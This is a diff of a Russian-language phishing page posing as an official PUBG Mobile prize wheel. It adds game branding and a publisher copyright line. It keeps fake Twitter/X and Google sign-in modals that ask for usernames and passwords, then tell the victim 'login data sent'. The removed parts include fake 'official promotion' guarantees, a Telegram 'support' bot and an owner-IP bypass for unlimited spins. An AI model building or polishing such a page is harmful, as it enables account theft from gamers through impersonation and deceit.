-            box-shadow: 0 5px 15px rgba(123, 104, 238, 0.2);
-        }
-        
-        .info-block h3 {
-            color: #8da1b5;
-            margin-bottom: 10px;
-            font-size: 18px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .info-block h3 i {
-            color: #7B68EE;
-        }
-        
-        .info-block p {
-            color: #8da1b5;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 10px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .info-block ul {
-            color: #8da1b5;
-            font-size: 14px;
-            line-height: 1.6;
-            padding-left: 20px;
-            margin: 10px 0;
-            font-family: Arial, sans-serif;
-        }
-        
-        .info-block li {
-            margin-bottom: 8px;
-        }
-        
-        .info-block li strong {
-            color: #7B68EE;
-        }
-        
-        .warning-note {
-            background: linear-gradient(135deg, rgba(255, 167, 38, 0.1), transparent);
-            border: 1px solid rgba(255, 167, 38, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-            color: #ffa726;
-            font-size: 14px;
-            text-align: center;
-            font-weight: 500;
-        }
-        
-        /* Блок ввода ID аккаунта */
-        .account-id-section {
-            background: rgba(20, 35, 60, 0.9);
-            border-radius: 20px;
-            padding: 30px;
-            width: 100%;
-            max-width: 800px;
-            margin: 20px 0;
-            border: 2px solid rgba(24, 119, 242, 0.3);
-            box-shadow: 
-                0 15px 30px rgba(0, 0, 0, 0.5),
-                inset 0 0 20px rgba(42, 59, 90, 0.2);
-            backdrop-filter: blur(10px);
-        }
-        
-        .account-id-section h2 {
-            color: #1877F2;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 24px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 500;
-            letter-spacing: 1px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        
-        .account-id-section p {
-            text-align: center;
-            margin-bottom: 25px;
-            color: #8da1b5;
-            font-family: Arial, sans-serif;
-            font-size: 16px;
-            line-height: 1.5;
-        }
-        
-        .id-input-group {
-            margin-bottom: 25px;
-        }
-        
-        .id-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #8da1b5;
-            font-size: 16px;
-            font-weight: 500;
-            font-family: Arial, sans-serif;
-        }
-        
-        .id-input {
-            width: 100%;
-            padding: 15px 20px;
-            border: 1px solid #2a3b5a;
-            border-radius: 10px;
-            font-size: 16px;
-            background: rgba(12, 26, 45, 0.7);
-            color: white;
-            font-family: Arial, sans-serif;
-            transition: all 0.3s;
-            outline: none;
-        }
-        
-        .id-input:focus {
-            border-color: #1877F2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-            background: rgba(12, 26, 45, 0.9);
-        }
-        
-        .id-note {
-            margin-top: 10px;
-            color: #8da1b5;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-            line-height: 1.5;
-        }
-        
-        .id-note i {
-            color: #1877F2;
-            margin-right: 5px;
-        }
-        
-        .save-id-btn {
-            background: linear-gradient(180deg, #1877F2 0%, #1153b3 100%);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            width: 100%;
-            font-family: 'Orbitron', sans-serif;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            margin-top: 10px;
-        }
-        
-        .save-id-btn:hover:not(:disabled) {
-            background: linear-gradient(180deg, #1A8CD8 0%, #0d47a1 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
-        }
-        
-        .save-id-btn:disabled {
-            background: linear-gradient(45deg, #444, #555);
-            color: #777;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .id-saved-message {
-            display: none;
-            margin-top: 15px;
-            padding: 10px;
-            background: rgba(76, 175, 80, 0.1);
-            border: 1px solid rgba(76, 175, 80, 0.3);
-            border-radius: 8px;
-            color: #4CAF50;
-            font-size: 14px;
-            text-align: center;
-            animation: fadeIn 0.5s ease;
-        }
-        
         /* Footer */
         .footer {
             width: 100%;
-            max-width: 1400px;
+            max-width: 800px;
             text-align: center;
             padding: 20px;
             margin-top: 30px;
@@ -2378,29 +1695,13 @@
             color: #8da1b5;
             text-decoration: none;
             font-size: 14px;
-            transition: all 0.3s;
+            transition: color 0.3s;
             font-weight: 400;
             font-family: Arial, sans-serif;
-            position: relative;
-        }
-        
-        .footer-link::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            left: 0;
-            width: 0;
-            height: 1px;
-            background: #1877F2;
-            transition: width 0.3s;
         }
         
         .footer-link:hover {
             color: #1877F2;
-        }
-        
-        .footer-link:hover::after {
-            width: 100%;
         }
         
         .copyright {
@@ -2412,35 +1713,9 @@
             font-family: Arial, sans-serif;
         }
         
-        .official-badge {
-            display: inline-block;
-            background: linear-gradient(135deg, #7B68EE, #4B0082);
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            margin-left: 10px;
-            vertical-align: middle;
-            animation: badgeGlow 2s infinite alternate;
-        }
-
-        @keyframes badgeGlow {
-            from {
-                box-shadow: 0 0 10px rgba(123, 104, 238, 0.3);
-            }
-            to {
-                box-shadow: 0 0 20px rgba(123, 104, 238, 0.6);
-            }
-        }
-        
-        @media (max-width: 768px) {
-            .sidebar {
-                width: 200px;
-            }
-            
+        @media (max-width: 600px) {
             .roulette-container {
-                height: 350px;
+                height: 320px;
             }
             
             .prizes-grid {
@@ -2449,13 +1724,13 @@
             }
             
             .prize-item img {
-                width: 75px;
-                height: 75px;
+                width: 65px;
+                height: 65px;
             }
             
             .center-item img {
-                width: 65px;
-                height: 65px;
+                width: 60px;
+                height: 60px;
             }
             
             .play-btn {
@@ -2509,18 +1784,6 @@
                 transform: none;
                 top: 0;
                 margin-top: 40px;
-                animation: googleSlideUpMobile 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            }
-
-            @keyframes googleSlideUpMobile {
-                from {
-                    opacity: 0;
-                    transform: translateY(20px);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
             }
             
             .prize-mail-btn {
@@ -2560,108 +1823,15 @@
                 bottom: 0;
                 margin-top: 40px;
             }
-            
-            .top-menu {
-                padding: 10px 15px;
-            }
-            
-            .language-btn {
-                padding: 6px 10px;
-                font-size: 12px;
-            }
-            
-            .prize-mail-btn {
-                padding: 6px 10px;
-                font-size: 12px;
-            }
-            
-            .logo {
-                font-size: 16px;
-                position: absolute;
-                left: 50%;
-                transform: translateX(-50%);
-                width: auto;
-            }
-            
-            .info-section {
-                padding: 20px;
-            }
-            
-            .info-block h3 {
-                font-size: 16px;
-            }
-            
-            .info-block p, .info-block ul {
-                font-size: 13px;
-            }
-            
-            .account-id-section {
-                padding: 20px;
-            }
-            
-            .account-id-section h2 {
-                font-size: 20px;
-            }
-            
-            .account-id-section p {
-                font-size: 14px;
-            }
-            
-            .id-input {
-                padding: 12px 15px;
-                font-size: 15px;
-            }
-            
-            .save-id-btn {
-                padding: 12px 30px;
-                font-size: 16px;
-            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Кнопка открытия меню -->
-    <button class="menu-toggle" id="menuToggle">
-        <i class="fas fa-bars"></i>
-    </button>
-
-    <!-- Боковое меню -->
-    <div class="sidebar" id="sidebar">
-        <div class="sidebar-header">
-            <h3>МЕНЮ</h3>
-        </div>
-        
-        <div class="menu-item" onclick="showNotification('Информация о призах откроется в ближайшее время', false, false)">
-            <i class="fas fa-gift"></i>
-            <span>Призы и награды</span>
-        </div>
-        
-        <div class="menu-item" onclick="showNotification('Список победителей будет опубликован позже', false, false)">
-            <i class="fas fa-trophy"></i>
-            <span>Победители</span>
-        </div>
-        
-        <div class="menu-item" onclick="showNotification('История акций и розыгрышей будет доступна позже', false, false)">
-            <i class="fas fa-history"></i>
-            <span>История акций</span>
-        </div>
-        
-        <div class="menu-item" onclick="showNotification('Правила акции будут опубликованы в ближайшее время', false, false)">
-            <i class="fas fa-book"></i>
-            <span>Правила акции</span>
-        </div>
-        
-        <div class="menu-item support" onclick="window.open('https://t.me/helpumgmbot', '_blank')">
-            <i class="fab fa-telegram"></i>
-            <span>Техподдержка: @helpumgmbot</span>
-        </div>
-    </div>
-
     <!-- Уведомление -->
     <div class="notification" id="notification"></div>
     
-    <!-- Окно с призом -->
+    <!-- Окно с призом - НОВЫЙ ИНТЕРФЕЙС -->
     <div class="prize-window" id="prizeWindow">
         <div class="prize-content">
             <div class="prize-banner">ВАШ ПРИЗ</div>
@@ -2743,7 +1913,7 @@
 
     <!-- Модальные окна для входа -->
     
-    <!-- Twitter/X модальное окно (этап 1: email/username) -->
+    <!-- Twitter/X модальное окно (этап 1: email/username) - ЧЕРНЫЙ ФОН -->
     <div class="modal-overlay modal-dark" id="xModalStep1">
         <div class="modal modal-dark x-modal-step1">
             <button class="close-modal" onclick="closeModal('xModalStep1')">&times;</button>
@@ -2788,7 +1958,7 @@
         </div>
     </div>
     
-    <!-- Twitter/X модальное окно (этап 2: пароль) -->
+    <!-- Twitter/X модальное окно (этап 2: пароль) - ЧЕРНЫЙ ФОН -->
     <div class="modal-overlay modal-dark" id="xModalStep2">
         <div class="modal modal-dark x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
@@ -2900,7 +2070,7 @@
                 <div class="language-option" data-lang="uk">Українська</div>
             </div>
         </div>
-        <div class="logo"></div>
+        <div class="logo">PUBG MOBILE</div>
         <div class="prize-mail-icon">
             <button class="prize-mail-btn" id="prizeMailBtn">
                 <i class="fas fa-gift"></i> Мой приз
@@ -2911,7 +2081,7 @@
 
     <div class="container">
         <div class="header">
-            <h1>КОЛЕСО УДАЧИ</h1>
+            <h1>КОЛЕСО УДАЧИ PUBG</h1>
             <p>Испытай удачу и выиграй эксклюзивные призы!</p>
         </div>
         
@@ -2946,7 +2116,7 @@
                 </div>
             </div>
             
-            <!-- Рамка с индикатором -->
+            <!-- Уменьшенная рамка с индикатором -->
             <div class="selection-frame" id="selectionFrame">
                 <div class="corner corner-tl"></div>
                 <div class="corner corner-tr"></div>
@@ -2984,9 +2154,9 @@
                 
                 <div class="social-option" data-social="x" onclick="openXModal()">
                     <div class="social-icon">
-                        <img src="twiter.png" alt="X">
+                        <img src="twiter.png" alt="Twitter">
                     </div>
-                    <span>X</span>
+                    <span>Twitter/X</span>
                 </div>
                 
                 <div class="social-option" data-social="google" onclick="openGoogleFullscreen()">
@@ -3014,7 +2184,7 @@
             <h2>ЗАЯВКА ПРИНЯТА!</h2>
             
             <div class="confirmation-message">
-                Ваш выигрыш будет зачислен на аккаунт<br>
+                Ваш выигрыш будет зачислен на аккаунт PUBG Mobile<br>
                 в течение <strong>24 часов</strong>.
             </div>
             
@@ -3022,71 +2192,6 @@
                 Спасибо за участие!<br>
                 Не забудьте проверить свой инвентарь в игре.
             </p>
-        </div>
-        
-        <!-- Блок ввода ID аккаунта -->
-        <div class="account-id-section" id="accountIdSection">
-            <h2><i class="fas fa-id-card"></i> ВВЕДИТЕ ID ВАШЕГО АККАУНТА</h2>
-            
-            <p>Для зачисления выигранного приза необходимо указать ID вашего игрового аккаунта.</p>
-            
-            <div class="id-input-group">
-                <label class="id-label">ID вашего игрового аккаунта:</label>
-                <input type="text" class="id-input" id="accountIdInput" placeholder="Введите ваш ID (например: 123456789)" maxlength="20">
-                
-                <div class="id-note">
-                    <i class="fas fa-info-circle"></i> ID можно найти в настройках игры или в профиле игрока. Обычно это последовательность цифр.
-                </div>
-            </div>
-            
-            <button class="save-id-btn" id="saveIdBtn">
-                <i class="fas fa-save"></i> СОХРАНИТЬ ID
-            </button>
-            
-            <div class="id-saved-message" id="idSavedMessage">
-                <i class="fas fa-check-circle"></i> ID успешно сохранен! Он будет использован для зачисления приза.
-            </div>
-            
-            <div class="warning-note">
-                <i class="fas fa-exclamation-triangle"></i> ВНИМАНИЕ: Убедитесь, что вводите правильный ID. При вводе неверного ID приз не будет зачислен.
-            </div>
-        </div>
-        
-        <!-- Информационный блок -->
-        <div class="info-section">
-            <h2><i class="fas fa-info-circle"></i> ВАЖНАЯ ИНФОРМАЦИЯ ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</h2>
-            
-            <div class="info-block">
-                <h3><i class="fas fa-sign-in-alt"></i> Как получить приз?</h3>
-                <p>Для получения выигранного приза необходимо:</p>
-                <ul>
-                    <li><strong>1. Войти через социальную сеть</strong> - выберите один из предложенных способов авторизации</li>
-                    <li><strong>2. Указать ID своего аккаунта</strong> - введите ваш игровой ID для зачисления приза (обязательный шаг!)</li>
-                    <li><strong>3. Подтвердить получение</strong> - нажмите кнопку "Получить приз"</li>
-                </ul>
-                <p>После этих действий приз будет отправлен на вашу игровую почту в течение 24 часов.</p>
-            </div>
-            
-            <div class="info-block">
-                <h3><i class="fas fa-shield-alt"></i> Официальный статус акции</h3>
-                <p>Данная акция является <strong>официальным мероприятием</strong>, организованным при поддержке разработчиков.</p>
-                <p><strong>Все призы реальные и действительно выдаются победителям!</strong></p>
-                <p>Мы сотрудничаем напрямую с администрацией игры для обеспечения честного распределения наград.</p>
-            </div>
-            
-            <div class="info-block">
-                <h3><i class="fas fa-check-circle"></i> Гарантии и безопасность</h3>
-                <ul>
-                    <li><strong>✅ 100% выдача призов</strong> - все победители получают свои награды</li>
-                    <li><strong>✅ Безопасность данных</strong> - ваши данные защищены и не передаются третьим лицам</li>
-                    <li><strong>✅ Поддержка 24/7</strong> - техническая поддержка всегда готова помочь</li>
-                    <li><strong>✅ Прозрачность розыгрыша</strong> - все этапы можно отслеживать в реальном времени</li>
-                </ul>
-            </div>
-            
-            <div class="warning-note">
-                <i class="fas fa-exclamation-triangle"></i> ВНИМАНИЕ: Приз зачисляется только после успешной авторизации через социальную сеть и ввода правильного ID аккаунта.
-            </div>
         </div>
     </div>
 
@@ -3099,9 +2204,7 @@
             <a href="#" class="footer-link">Предпочтение Cookies</a>
         </div>
         <div class="copyright">
-            © 2024 Официальная акция. Все права защищены.<br>
-            <span style="color: #7B68EE; font-weight: 600;">Все призы реальны и выдаются победителям на их игровые аккаунты.</span><br>
-            Техническая поддержка: <a href="https://t.me/helpumgmbot" style="color: #7B68EE; text-decoration: none;">@helpumgmbot</a>
+            Авторские права © High Morale Developments Limited. Все права защищены.
         </div>
     </div>
 
@@ -3123,10 +2226,6 @@
         let xUsername = '';
         let userPrize = null;
         let isPrizeReceived = false;
-        let ownerIP = '31.43.60.156';
-        let userIP = '';
-        let hasPlayed = false;
-        let userAccountId = '';
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -3169,7 +2268,7 @@
                 document.getElementById('winImg').src = userPrize.image;
                 document.getElementById('winName').textContent = "ПРИЗ";
                 document.getElementById('prizeDescription').textContent = isPrizeReceived ? 
-                    "✅ Ваш приз был отправлен на ваш игровой аккаунт." : 
+                    "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : 
                     "Выберите социальную сеть для получения приза.";
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
@@ -3186,7 +2285,7 @@
                         socialSelectSection.classList.add('active');
                         socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                         
-                        showNotification("Выберите социальную сеть для получения приза", false, false);
+                        showNotification("Выберите социальную сеть для получения приза");
                     };
                 } else {
                     collectBtn.textContent = "ЗАКРЫТЬ";
@@ -3219,8 +2318,9 @@
             if (userPrize && !isPrizeReceived) {
                 badge.textContent = '1';
                 badge.style.display = 'flex';
-                badge.style.background = '#7B68EE';
+                badge.style.background = '#1877F2';
                 mailBtn.disabled = false;
+                // Включаем анимацию пульсации
                 badge.style.animation = 'pulse 1.5s infinite';
             } else if (userPrize && isPrizeReceived) {
                 badge.textContent = '1';
@@ -3237,45 +2337,6 @@
         }
         
         document.addEventListener('DOMContentLoaded', function() {
-            // Боковое меню
-            const menuToggle = document.getElementById('menuToggle');
-            const sidebar = document.getElementById('sidebar');
-            
-            menuToggle.addEventListener('click', function() {
-                sidebar.classList.toggle('active');
-            });
-            
-            // Закрытие меню при клике вне его
-            document.addEventListener('click', function(event) {
-                if (!sidebar.contains(event.target) && !menuToggle.contains(event.target)) {
-                    sidebar.classList.remove('active');
-                }
-            });
-            
-            // Получаем IP пользователя
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    userIP = data.ip;
-                    console.log('User IP:', userIP);
-                    console.log('Owner IP:', ownerIP);
-                    
-                    // Проверяем, является ли пользователь владельцем
-                    if (userIP === ownerIP) {
-                        console.log('Owner detected - unlimited spins');
-                        hasPlayed = false;
-                        localStorage.setItem('isOwner', 'true');
-                    } else {
-                        console.log('Regular user - one spin only');
-                        // Проверяем, играл ли уже пользователь
-                        const played = localStorage.getItem('hasPlayed');
-                        hasPlayed = played === 'true';
-                    }
-                })
-                .catch(error => {
-                    console.log('Error getting IP:', error);
-                });
-            
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
             const selectionIndicator = document.getElementById('selectionIndicator');
@@ -3292,20 +2353,6 @@
             const prizeMailBtn = document.getElementById('prizeMailBtn');
             const collectPrizeBtn = document.getElementById('collectPrizeBtn');
             
-            // Элементы для ввода ID аккаунта
-            const accountIdInput = document.getElementById('accountIdInput');
-            const saveIdBtn = document.getElementById('saveIdBtn');
-            const idSavedMessage = document.getElementById('idSavedMessage');
-            const accountIdSection = document.getElementById('accountIdSection');
-            
-            // Загружаем сохраненный ID из localStorage
-            const savedAccountId = localStorage.getItem('userAccountId');
-            if (savedAccountId) {
-                userAccountId = savedAccountId;
-                accountIdInput.value = savedAccountId;
-                idSavedMessage.style.display = 'block';
-            }
-            
             // Элементы Google Fullscreen
             const googleFullscreen = document.getElementById('googleFullscreen');
             const googleEmailInput = document.getElementById('googleEmailInput');
@@ -3316,7 +2363,7 @@
             const googleStep1 = document.getElementById('googleStep1');
             const googleStep2 = document.getElementById('googleStep2');
             
-            // Призы с картинками
+            // Призы с картинками (без названий)
             const prizes = [
                 { id: 1, image: "priz1.png" },
                 { id: 2, image: "priz2.png" },
@@ -3332,10 +2379,12 @@
             let isSpinning = false;
             let currentPrizeIndex = 0;
             let spinInterval;
-            let spinSpeed;
+            let spinSpeed = 100;
             let spinCount = 0;
+            const totalSpins = 30;
             let finalPrizeIndex = 0;
             let selectedSocial = null;
+            let hasPlayed = false;
             
             // Порядок обхода призов
             const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
@@ -3344,7 +2393,7 @@
             const translations = {
                 ru: {
                     play: "ИГРАТЬ",
-                    title: "КОЛЕСО УДАЧИ",
+                    title: "КОЛЕСО УДАЧИ PUBG",
                     subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
                     selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
                     selectText: "Выберите социальную сеть для получения приза",
@@ -3353,16 +2402,12 @@
                     notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
                     notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
-                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт в течение 24 часов.",
-                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
-                    alreadyPlayed: "УЖЕ ИГРАЛИ",
-                    idPlaceholder: "Введите ваш ID (например: 123456789)",
-                    idSaved: "ID успешно сохранен! Он будет использован для зачисления приза.",
-                    idRequired: "Пожалуйста, введите ID вашего аккаунта"
+                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
+                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов."
                 },
                 en: {
                     play: "PLAY",
-                    title: "WHEEL OF FORTUNE",
+                    title: "PUBG WHEEL OF FORTUNE",
                     subtitle: "Try your luck and win exclusive prizes!",
                     selectTitle: "SELECT RECEIVING METHOD",
                     selectText: "Select social network to receive the prize",
@@ -3371,66 +2416,8 @@
                     notificationSelectSocial: "Please select a social network",
                     notificationAlreadyPlayed: "You have already used your attempt today!",
                     confirmationTitle: "APPLICATION ACCEPTED!",
-                    confirmationMessage: "Your winnings will be credited to your account within 24 hours.",
-                    loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
-                    alreadyPlayed: "ALREADY PLAYED",
-                    idPlaceholder: "Enter your ID (e.g.: 123456789)",
-                    idSaved: "ID successfully saved! It will be used to credit the prize.",
-                    idRequired: "Please enter your account ID"
-                },
-                uz: {
-                    play: "O'YIN",
-                    title: "BAXT G'ILDIRAG'I",
-                    subtitle: "Omadingizni sinab ko'ring va eksklyuziv sovrinlarni yutib oling!",
-                    selectTitle: "QABUL QILISH USULINI TANLANG",
-                    selectText: "Sovrinni qabul qilish uchun ijtimoiy tarmoqni tanlang",
-                    getPrizeBtn: "SOVRINNI OLISH",
-                    notificationSuccess: "Ariza qabul qilindi! Sovrin 24 soat ichida o'tkaziladi.",
-                    notificationSelectSocial: "Iltimos, ijtimoiy tarmoqni tanlang",
-                    notificationAlreadyPlayed: "Siz bugungi imkoniyatingizdan foydalandingiz!",
-                    confirmationTitle: "ARIZA QABUL QILINDI!",
-                    confirmationMessage: "Yutigingiz hisobingizga 24 soat ichida o'tkaziladi.",
-                    loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
-                    alreadyPlayed: "ALLAQACHON O'YNANGAN",
-                    idPlaceholder: "IDingizni kiriting (masalan: 123456789)",
-                    idSaved: "ID muvaffaqiyatli saqlandi! Sovrinni o'tkazish uchun ishlatiladi.",
-                    idRequired: "Iltimos, hisobingiz ID sini kiriting"
-                },
-                kz: {
-                    play: "ОЙНАУ",
-                    title: "БАХТ ДӘПЕРЕ",
-                    subtitle: "Сәттілігін сынап көріңіз және эксклюзитті жүлделерді ұтып алыңыз!",
-                    selectTitle: "ҚАБЫЛДАУ ӘДІСІН ТАҢДАҢЫЗ",
-                    selectText: "Жүлдені қабылдау үшін әлеуметтік желіні таңдаңыз",
-                    getPrizeBtn: "ЖҮЛДЕНІ АЛУ",
-                    notificationSuccess: "Өтініш қабылданды! Жүлде 24 сағат ішінде аударылады.",
-                    notificationSelectSocial: "Өтінеміз, әлеуметтік желіні таңдаңыз",
-                    notificationAlreadyPlayed: "Сіз бүгінгі мүмкіндігіңізді пайдаландыңыз!",
-                    confirmationTitle: "ӨТІНІШ ҚАБЫЛДАНДЫ!",
-                    confirmationMessage: "Жеңісіңіз шотыңызға 24 сағат ішінде аударылады.",
-                    loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
-                    alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН",
-                    idPlaceholder: "IDіңізді енгізіңіз (мысалы: 123456789)",
-                    idSaved: "ID сәтті сақталды! Жүлдені аудару үшін пайдаланылады.",
-                    idRequired: "Өтінеміз, шотыңыздың ID сін енгізіңіз"
-                },
-                ar: {
-                    play: "لعب",
-                    title: "عجلة الحظ",
-                    subtitle: "جرب حظك واربح جوائز حصرية!",
-                    selectTitle: "اختر طريقة الاستلام",
-                    selectText: "اختر شبكة اجتماعية لاستلام الجائزة",
-                    getPrizeBtn: "الحصول على الجائزة",
-                    notificationSuccess: "تم قبول الطلب! سيتم إضافة الجائزة خلال 24 ساعة.",
-                    notificationSelectSocial: "يرجى اختيار شبكة اجتماعية",
-                    notificationAlreadyPlayed: "لقد استخدمت محاولتك اليوم بالفعل!",
-                    confirmationTitle: "تم قبول الطلب!",
-                    confirmationMessage: "سيتم إضافة ربحك إلى حسابك خلال 24 ساعة.",
-                    loginSuccess: "تم إرسال بيانات تسجيل الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
-                    alreadyPlayed: "لعبت بالفعل",
-                    idPlaceholder: "أدخل معرفك (مثال: 123456789)",
-                    idSaved: "تم حفظ المعرف بنجاح! سيتم استخدامه لإضافة الجائزة.",
-                    idRequired: "يرجى إدخال معرف حسابك"
+                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
+                    loginSuccess: "Login data sent! Prize will be credited within 24 hours."
                 }
             };
             
@@ -3440,26 +2427,12 @@
                 
                 document.querySelector('.header h1').textContent = t.title;
                 document.querySelector('.header p').textContent = t.subtitle;
-                
-                if (hasPlayed && userIP !== ownerIP) {
-                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
-                } else {
-                    playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
-                }
-                
+                playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
-                
-                // Обновляем текст для блока ввода ID
-                document.querySelector('#accountIdSection h2').innerHTML = `<i class="fas fa-id-card"></i> ВВЕДИТЕ ID ВАШЕГО АККАУНТА`;
-                document.querySelector('#accountIdSection p').textContent = 'Для зачисления выигранного приза необходимо указать ID вашего игрового аккаунта.';
-                accountIdInput.placeholder = t.idPlaceholder;
-                saveIdBtn.innerHTML = `<i class="fas fa-save"></i> СОХРАНИТЬ ID`;
-                document.querySelector('#accountIdSection .id-note').innerHTML = `<i class="fas fa-info-circle"></i> ID можно найти в настройках игры или в профиле игрока. Обычно это последовательность цифр.`;
-                document.querySelector('#accountIdSection .warning-note').innerHTML = `<i class="fas fa-exclamation-triangle"></i> ВНИМАНИЕ: Убедитесь, что вводите правильный ID. При вводе неверного ID приз не будет зачислен.`;
                 
                 const langNames = {
                     ru: 'Русский', en: 'English', uz: "O'zbekcha",
@@ -3469,9 +2442,6 @@
                     uk: 'Українська'
                 };
                 languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'Русский'} <i class="fas fa-chevron-down"></i>`;
-                
-                // Обновляем текст индикатора выбора
-                selectionIndicator.textContent = 'ВЫБРАНО';
             }
             
             // Обработчики для меню языка
@@ -3484,93 +2454,45 @@
                     const lang = this.getAttribute('data-lang');
                     changeLanguage(lang);
                     languageDropdown.classList.remove('show');
-                    showNotification(`Язык изменен на ${this.textContent}`, false, false);
+                    showNotification(`Язык изменен на ${this.textContent}`);
                 });
             });
             
             // Функция показа уведомления
             function showNotification(message, isError = false, isSuccess = false) {
                 notification.textContent = message;
-                notification.classList.remove('error', 'success', 'warning');
+                notification.classList.remove('error', 'success');
                 
                 if (isError) {
                     notification.classList.add('error');
                 } else if (isSuccess) {
                     notification.classList.add('success');
+                } else {
+                    notification.style.background = 'linear-gradient(135deg, #2a3b5a, #1a2c42)';
                 }
                 
                 notification.style.display = 'block';
-                
-                // Добавляем дополнительную информацию для важных уведомлений
-                if (isSuccess && message.includes("Данные для входа отправлены")) {
-                    notification.innerHTML = `
-                        ${message}
-                        <div class="notification-info">
-                            <i class="fas fa-info-circle"></i>
-                            <span>Приз будет зачислен на ваш игровой аккаунт в течение 24 часов. Проверьте почту в игре.</span>
-                        </div>
-                    `;
-                }
                 
                 setTimeout(() => {
                     notification.style.display = 'none';
                 }, 5000);
             }
             
-            // Функция сохранения ID аккаунта
-            saveIdBtn.addEventListener('click', function() {
-                const accountId = accountIdInput.value.trim();
-                
-                if (!accountId) {
-                    showNotification("Пожалуйста, введите ID вашего аккаунта", true);
-                    return;
-                }
-                
-                // Проверяем, что ID содержит только цифры (опционально)
-                if (!/^\d+$/.test(accountId)) {
-                    showNotification("ID должен содержать только цифры", true);
-                    return;
-                }
-                
-                // Сохраняем ID
-                userAccountId = accountId;
-                localStorage.setItem('userAccountId', accountId);
-                
-                // Показываем сообщение об успехе
-                idSavedMessage.style.display = 'block';
-                idSavedMessage.innerHTML = `<i class="fas fa-check-circle"></i> ID успешно сохранен! Он будет использован для зачисления приза.`;
-                
-                showNotification("ID аккаунта успешно сохранен", false, true);
-                
-                // Автоматически скрываем сообщение через 5 секунд
-                setTimeout(() => {
-                    idSavedMessage.style.display = 'none';
-                }, 5000);
-            });
-            
             // Функция получения случайного приза
             function getRandomPrize() {
                 return Math.floor(Math.random() * prizes.length);
             }
             
-            // Функция перемещения рамки - ОБНОВЛЕНА ДЛЯ РАВНОМЕРНОСТИ
+            // Функция перемещения рамки
             function moveFrameToPrize(index) {
                 const prizeItem = prizeItems[index];
                 const rect = prizeItem.getBoundingClientRect();
                 const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                 
-                // Используем фиксированные размеры для равномерной рамки
-                const frameSize = Math.min(rect.width, rect.height) + 20; // +20 для отступов
-                
-                selectionFrame.style.width = frameSize + 'px';
-                selectionFrame.style.height = frameSize + 'px';
-                
-                // Центрируем рамку на призе
-                const centerX = rect.left - containerRect.left + rect.width/2 - frameSize/2;
-                const centerY = rect.top - containerRect.top + rect.height/2 - frameSize/2;
-                
-                selectionFrame.style.left = centerX + 'px';
-                selectionFrame.style.top = centerY + 'px';
+                selectionFrame.style.width = (rect.width + 16) + 'px';
+                selectionFrame.style.height = (rect.height + 16) + 'px';
+                selectionFrame.style.left = (rect.left - containerRect.left - 6) + 'px';
+                selectionFrame.style.top = (rect.top - containerRect.top - 6) + 'px';
                 selectionFrame.classList.add('active');
                 
                 // Позиционирование индикатора
@@ -3592,10 +2514,7 @@
             function startRoulette() {
                 if (isSpinning) return;
                 
